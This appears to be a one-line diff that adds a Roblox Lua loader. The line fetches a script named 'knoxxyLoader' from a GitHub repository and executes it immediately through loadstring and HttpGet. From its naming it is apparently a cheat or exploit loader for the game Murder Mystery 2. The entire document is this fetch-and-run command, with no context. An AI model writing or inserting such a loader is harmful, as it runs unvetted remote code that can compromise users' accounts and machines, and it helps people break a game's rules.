@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KnoxScript1/mm2test/refs/heads/main/knoxxyLoader"))()
